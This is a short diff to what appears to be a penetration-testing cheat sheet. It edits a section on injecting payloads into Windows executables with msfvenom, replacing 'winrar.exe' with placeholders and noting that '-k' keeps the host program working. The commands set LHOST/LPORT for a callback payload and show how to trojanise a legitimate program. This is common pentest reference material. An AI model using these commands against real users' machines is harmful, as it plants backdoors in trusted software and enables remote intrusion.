@@ -548,9 +548,9 @@ msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -
 
 #### Injecting Payloads into Window PEs
 ```
-msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f exe -x winrar.exe > winrar.exe
+msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f exe -x <PE_1> > <PE_2>
 ```
-- `-k` will preserve functionality of `winrar.exe`.
+- `-k` will preserve the original functionality of `<PE_1>`; may not work for every PE.
 
 ## Linux Compilation
 ```
